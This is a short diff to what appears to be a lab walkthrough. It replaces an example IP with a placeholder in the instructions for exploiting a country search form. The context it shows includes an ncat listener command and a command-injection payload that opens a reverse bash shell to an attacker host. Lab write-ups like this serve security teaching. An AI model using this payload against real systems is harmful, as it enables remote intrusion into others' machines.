@@ -18,7 +18,7 @@ Start a listener on your attacker machine (replace `9001` with any open port):
 ncat -lvnp 9001
 ```
 
-Submit the following payload in the country search form (replace `10.10.10.10` with your attacker IP):
+Submit the following payload in the country search form (replace `xxx.xx.xx.xx` with your attacker IP):
 
 ```
 ' ; ncat xxx.xx.xx.xx 9001 -c 'bash -i' ; '
